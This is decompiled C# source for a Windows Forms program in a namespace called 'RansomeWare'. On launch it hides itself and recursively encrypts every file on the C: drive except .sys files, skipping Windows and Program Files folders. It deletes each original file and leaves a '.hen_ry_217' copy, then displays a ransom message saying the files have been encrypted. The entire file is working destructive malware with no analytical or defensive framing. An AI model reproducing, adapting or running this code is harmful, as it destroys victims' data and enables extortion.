using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Threading;
using System.Windows.Forms;

namespace RansomeWare;

public class Form1 : Form
{
	private IContainer components;

	private Label label1;

	public Form1()
	{
		InitializeComponent();
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		Thread.Sleep(100);
		DirectoryInfo di = new DirectoryInfo("C:\\");
		Thread.Sleep(100);
		bl(di);
		Thread.Sleep(100);
		((Control)this).Show();
	}

	public static byte[] Sysdiag(byte[] Data, string Key, string Vector)
	{
		byte[] rgbKey = new byte[32];
		byte[] rgbIV = new byte[16];
		byte[] array = null;
		Rijndael rijndael = Rijndael.Create();
		try
		{
			using MemoryStream memoryStream = new MemoryStream();
			using CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateEncryptor(rgbKey, rgbIV), CryptoStreamMode.Write);
			cryptoStream.Write(Data, 0, Data.Length);
			cryptoStream.FlushFinalBlock();
			return memoryStream.ToArray();
		}
		catch
		{
			return null;
		}
	}

	public void bl(DirectoryInfo di)
	{
		int num = 0;
		FileInfo[] files = di.GetFiles();
		foreach (FileInfo fileInfo in files)
		{
			num++;
			try
			{
				if (Path.GetExtension(fileInfo.FullName) != ".sys" && Path.GetExtension(fileInfo.FullName) != ".hen_ry_217")
				{
					FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read);
					byte[] array = new byte[fileStream.Length];
					fileStream.Read(array, 0, (int)fileStream.Length);
					byte[] array2 = Sysdiag(array, "SysdiagProjectProjectProjectProj", "ProjectProjectSy");
					FileStream fileStream2 = new FileStream(fileInfo.FullName + ".hen_ry_217", FileMode.Create, FileAccess.Write);
					fileStream2.Write(array2, 0, array2.Length);
					fileStream2.Flush();
					fileStream2.Close();
					fileStream.Close();
					File.Delete(fileInfo.FullName);
				}
			}
			catch (Exception)
			{
			}
		}
		DirectoryInfo[] directories = di.GetDirectories();
		foreach (DirectoryInfo directoryInfo in directories)
		{
			try
			{
				if (directoryInfo.Name != "Windows" && directoryInfo.Name != "Program Files" && directoryInfo.Name != "Program Files (x86)" && directoryInfo.Name != "Microsoft" && directoryInfo.Name.Substring(0, 1) != " " && directoryInfo.Name.Substring(0, 1) != "Z")
				{
					bl(directoryInfo);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_011a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0124: Expected O, but got Unknown
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("微软雅黑", 18f, (FontStyle)0, (GraphicsUnit)3, (byte)134));
		((Control)label1).set_Location(new Point(43, 6));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(439, 31));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Y0ur fi|e$ have been encr#pt by /\\/\\E");
		((Control)label1).add_Click((EventHandler)label1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(533, 48));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_Margin(new Padding(2, 2, 2, 2));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Hello");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
